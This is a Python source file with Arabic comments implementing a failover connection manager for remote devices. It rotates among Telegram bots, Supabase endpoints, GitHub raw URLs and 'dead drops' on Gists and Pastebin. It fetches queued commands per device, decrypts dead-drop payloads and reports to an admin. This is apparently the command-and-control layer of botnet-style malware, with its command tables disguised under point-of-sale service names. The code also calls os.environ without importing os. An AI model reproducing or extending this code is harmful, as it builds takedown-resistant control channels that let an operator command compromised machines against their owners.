#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
connection_manager.py – إدارة قنوات الاتصال المتعددة مع نظام Failover ذكي
يدعم:
- بوتات تلغرام (قائمة رئيسية واحتياطية)
- عدة نقاط نهاية Supabase
- Dead Drops (GitHub Gists, Pastebin, قنوات تلغرام مشفرة)
- روابط GitHub raw كقناة احتياطية إضافية
- اكتشاف الأعطال والتبديل التلقائي
- إحصائيات أداء القنوات
- تخزين واسترجاع الإعدادات النشطة
"""

import threading
import time
import logging
import requests
import json
import base64
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime

# استيراد CryptoManager للتشفير إذا احتاج Dead Drops
from crypto_utils import CryptoManager


class ConnectionManager:
    """
    يدير اتصالات متعددة (بوتات تلغرام، Supabase، Dead Drops، GitHub raw)
    ويوفر آلية Failover للتبديل التلقائي عند فشل إحدى القنوات.
    """

    def __init__(self, config: dict, crypto: Optional[CryptoManager] = None):
        """
        :param config: قاموس يحتوي على إعدادات القنوات بالصيغة:
            {
                'telegram': {'tokens': ['TOKEN1', 'TOKEN2', ...]},
                'supabase': {'urls': ['URL1', 'URL2', ...], 'keys': ['KEY1', 'KEY2', ...]},
                'dead_drop': {'urls': ['https://gist.github.com/...', 'https://pastebin.com/...']},
                'github_raw': {'urls': ['https://raw.githubusercontent.com/...', ...]}
            }
        :param crypto: كائن CryptoManager (اختياري) لفك تشفير Dead Drops إذا كانت مشفرة
        """
        self.config = config
        self.crypto = crypto

        # قوائم القنوات
        self.telegram_tokens: List[str] = config.get('telegram', {}).get('tokens', [])
        self.supabase_urls: List[str] = config.get('supabase', {}).get('urls', [])
        self.supabase_keys: List[str] = config.get('supabase', {}).get('keys', [])
        self.dead_drop_urls: List[str] = config.get('dead_drop', {}).get('urls', [])
        self.github_raw_urls: List[str] = config.get('github_raw', {}).get('urls', [])

        # التأكد من تساوي أعداد URLs ومفاتيح Supabase
        if len(self.supabase_urls) != len(self.supabase_keys):
            logging.error("Supabase URLs and keys count mismatch. Disabling Supabase channels.")
            self.supabase_urls = []
            self.supabase_keys = []

        # فهارس القنوات النشطة (تبدأ من 0)
        self.active_telegram = 0
        self.active_supabase = 0
        self.active_dead_drop = 0
        self.active_github = 0

        # إحصائيات الأداء (اختيارية)
        self.channel_stats: Dict[str, Dict[str, Any]] = {}

        # قفل لمزامنة الوصول إلى الفهارس
        self._lock = threading.Lock()

    # ------------------------------------------------------------
    # دوال الحصول على القنوات النشطة (مع تبديل تلقائي داخلي)
    # ------------------------------------------------------------
    def get_active_telegram_token(self) -> Optional[str]:
        """إعادة توكن البوت النشط حاليًا، أو None إذا لم يتوفر."""
        with self._lock:
            if not self.telegram_tokens:
                return None
            return self.telegram_tokens[self.active_telegram]

    def get_active_supabase(self) -> Optional[Dict[str, str]]:
        """إعادة عنوان URL ومفتاح Supabase النشط، أو None إذا لم يتوفر."""
        with self._lock:
            if not self.supabase_urls:
                return None
            return {
                'url': self.supabase_urls[self.active_supabase],
                'key': self.supabase_keys[self.active_supabase]
            }

    def get_active_dead_drop(self) -> Optional[str]:
        """إعادة رابط Dead Drop النشط، أو None إذا لم يتوفر."""
        with self._lock:
            if not self.dead_drop_urls:
                return None
            return self.dead_drop_urls[self.active_dead_drop]

    def get_active_github_raw(self) -> Optional[str]:
        """إعادة رابط GitHub raw النشط، أو None إذا لم يتوفر."""
        with self._lock:
            if not self.github_raw_urls:
                return None
            return self.github_raw_urls[self.active_github]

    # ------------------------------------------------------------
    # التبديل إلى القناة التالية عند الفشل
    # ------------------------------------------------------------
    def rotate_telegram(self):
        """التبديل إلى البوت التالي في القائمة."""
        with self._lock:
            if len(self.telegram_tokens) > 1:
                self.active_telegram = (self.active_telegram + 1) % len(self.telegram_tokens)
                logging.info(f"Switched to Telegram bot index {self.active_telegram}")
            else:
                logging.warning("No backup Telegram token available.")

    def rotate_supabase(self):
        """التبديل إلى رابط Supabase التالي."""
        with self._lock:
            if len(self.supabase_urls) > 1:
                self.active_supabase = (self.active_supabase + 1) % len(self.supabase_urls)
                logging.info(f"Switched to Supabase index {self.active_supabase}")
            else:
                logging.warning("No backup Supabase URL available.")

    def rotate_dead_drop(self):
        """التبديل إلى Dead Drop التالي."""
        with self._lock:
            if len(self.dead_drop_urls) > 1:
                self.active_dead_drop = (self.active_dead_drop + 1) % len(self.dead_drop_urls)
                logging.info(f"Switched to Dead Drop index {self.active_dead_drop}")
            else:
                logging.warning("No backup Dead Drop URL available.")

    def rotate_github(self):
        """التبديل إلى رابط GitHub raw التالي."""
        with self._lock:
            if len(self.github_raw_urls) > 1:
                self.active_github = (self.active_github + 1) % len(self.github_raw_urls)
                logging.info(f"Switched to GitHub raw index {self.active_github}")
            else:
                logging.warning("No backup GitHub raw URL available.")

    # ------------------------------------------------------------
    # اختبار الاتصال بقناة معينة
    # ------------------------------------------------------------
    def test_telegram_token(self, token: str) -> bool:
        """اختبار صلاحية توكن تلغرام عبر getMe."""
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            r = requests.get(url, timeout=10)
            return r.status_code == 200
        except Exception as e:
            logging.debug(f"Telegram test failed for token {token[:6]}...: {e}")
            return False

    def test_supabase(self, url: str, key: str) -> bool:
        """اختبار الاتصال بـ Supabase عبر محاولة جلب جدول pos_clients (يفترض وجوده)."""
        try:
            headers = {"apikey": key, "Authorization": f"Bearer {key}"}
            r = requests.get(f"{url}/rest/v1/pos_clients?select=client_serial&limit=1",
                              headers=headers, timeout=10)
            return r.status_code == 200
        except Exception as e:
            logging.debug(f"Supabase test failed for {url}: {e}")
            return False

    def test_url(self, url: str) -> bool:
        """اختبار عام لأي رابط (GET بسيط)."""
        try:
            r = requests.get(url, timeout=10)
            return r.status_code < 500  # أي استجابة غير خطأ خادم تعتبر ناجحة
        except Exception:
            return False

    # ------------------------------------------------------------
    # فحص جميع القنوات والتبديل التلقائي عند الحاجة
    # ------------------------------------------------------------
    def check_all_channels(self):
        """
        يختبر جميع القنوات النشطة، وإذا فشلت القناة الحالية يحاول التبديل.
        """
        # تلغرام
        current_tg = self.get_active_telegram_token()
        if current_tg and not self.test_telegram_token(current_tg):
            logging.warning("Active Telegram bot failed, attempting rotation...")
            self.rotate_telegram()

        # Supabase
        current_sup = self.get_active_supabase()
        if current_sup and not self.test_supabase(current_sup['url'], current_sup['key']):
            logging.warning("Active Supabase failed, attempting rotation...")
            self.rotate_supabase()

        # Dead Drops (اختبار بسيط)
        current_dd = self.get_active_dead_drop()
        if current_dd and not self.test_url(current_dd):
            logging.warning("Active Dead Drop failed, attempting rotation...")
            self.rotate_dead_drop()

        # GitHub raw
        current_gh = self.get_active_github_raw()
        if current_gh and not self.test_url(current_gh):
            logging.warning("Active GitHub raw failed, attempting rotation...")
            self.rotate_github()

    # ------------------------------------------------------------
    # دوال لجلب الأوامر المعلقة من جميع القنوات (لصالح FailoverTester)
    # ------------------------------------------------------------
    def fetch_pending_commands(self, device_id: str, supabase_client=None) -> List[Dict]:
        """
        يجلب الأوامر المعلقة للجهاز من جميع القنوات المتاحة:
        - Supabase (إذا كان supabase_client متاحاً)
        - Dead Drops (محاولة قراءة ملف JSON مخصص للجهاز)
        - GitHub raw (مشابه)
        """
        commands = []

        # 1. من Supabase
        if supabase_client:
            try:
                resp = supabase_client.table('service_requests') \
                    .select('*') \
                    .eq('target_client', device_id) \
                    .eq('ticket_status', 'open') \
                    .execute()
                commands.extend(resp.data)
                # تحديث الحالة إلى processing
                for cmd in resp.data:
                    supabase_client.table('service_requests') \
                        .update({'ticket_status': 'processing'}) \
                        .eq('ticket_id', cmd['ticket_id']) \
                        .execute()
            except Exception as e:
                logging.error(f"Failed to fetch commands from Supabase: {e}")

        # 2. من Dead Drops (إذا كانت مشفرة، نفك التشفير)
        dd_url = self.get_active_dead_drop()
        if dd_url:
            try:
                full_url = f"{dd_url.rstrip('/')}/{device_id}.json"  # نفترض هيكل URL معين
                r = requests.get(full_url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    # إذا كان مشفراً، نفك التشفير
                    if isinstance(data, dict) and 'encrypted' in data and self.crypto:
                        encrypted = base64.b64decode(data['encrypted'])
                        decrypted = self.crypto.decrypt_stored_key(encrypted)
                        data = json.loads(decrypted)
                    if isinstance(data, list):
                        commands.extend(data)
            except Exception as e:
                logging.error(f"Failed to fetch from Dead Drop: {e}")

        # 3. من GitHub raw
        gh_url = self.get_active_github_raw()
        if gh_url:
            try:
                full_url = f"{gh_url.rstrip('/')}/{device_id}.json"
                r = requests.get(full_url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, list):
                        commands.extend(data)
            except Exception as e:
                logging.error(f"Failed to fetch from GitHub raw: {e}")

        return commands

    def send_message_to_admin(self, text: str):
        """
        إرسال رسالة إلى المشرف عبر أي قناة تلغرام متاحة.
        تحاول جميع البوتات حتى تنجح إحداها.
        """
        # نحاول البوتات بالترتيب، ونستخدم التبديل التلقائي إذا فشل البوت الحالي
        max_attempts = len(self.telegram_tokens) * 2  # أقصى محاولات
        for attempt in range(max_attempts):
            token = self.get_active_telegram_token()
            if not token:
                logging.error("No Telegram tokens available.")
                return
            try:
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                payload = {
                    'chat_id': os.environ.get('ADMIN_ID'),
                    'text': text,
                    'parse_mode': 'Markdown'
                }
                r = requests.post(url, json=payload, timeout=15)
                if r.status_code == 200:
                    return
                else:
                    # فشل، حاول التبديل
                    self.rotate_telegram()
            except Exception as e:
                logging.error(f"Telegram send failed: {e}")
                self.rotate_telegram()
        logging.error("All Telegram bots failed to send message.")

    # ------------------------------------------------------------
    # الحصول على الإعدادات النشطة لإرسالها للأجهزة
    # ------------------------------------------------------------
    def get_active_config(self) -> Dict[str, Any]:
        """
        يعيد الإعدادات الحالية التي يجب إرسالها للأجهزة.
        تشمل: قنوات الاتصال النشطة، فترات التحديث، إلخ.
        """
        return {
            'telegram': {
                'primary': self.get_active_telegram_token(),
                'backups': [t for i, t in enumerate(self.telegram_tokens) if i != self.active_telegram]
            },
            'supabase': self.get_active_supabase(),
            'dead_drop': self.get_active_dead_drop(),
            'github_raw': self.get_active_github_raw(),
            'commands_interval': 60,      # ثانية بين كل سحب أوامر
            'heartbeat_interval': 300,     # ثانية بين نبضات القلب
            'failover_retry': 30,          # ثانية قبل إعادة محاولة القناة الفاشلة
  }
